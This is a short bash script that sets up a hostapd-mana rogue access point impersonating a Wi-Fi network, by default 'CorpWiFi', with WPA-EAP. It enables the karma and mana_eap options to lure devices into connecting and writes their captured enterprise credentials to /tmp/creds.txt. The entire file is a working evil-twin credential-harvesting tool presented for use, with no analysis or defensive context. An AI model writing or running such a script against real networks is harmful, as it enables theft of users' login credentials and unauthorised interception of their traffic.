#!/bin/bash
# Deploy hostapd-mana rogue AP
# Usage: ./rogue-ap-deploy.sh <ssid> <channel> <interface>
SSID="${1:-CorpWiFi}"
CHAN="${2:-6}"
IFACE="${3:-wlan0}"

airmon-ng check kill
airmon-ng start "$IFACE"
MON="${IFACE}mon"

cat > /tmp/mana.conf << CONF
interface=$MON
ssid=$SSID
channel=$CHAN
wpa=2
wpa_key_mgmt=WPA-EAP
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
mana_eap=1
mana_cred_out=/tmp/creds.txt
karma=1
CONF

echo "[+] Starting rogue AP: $SSID on channel $CHAN"
hostapd-mana /tmp/mana.conf
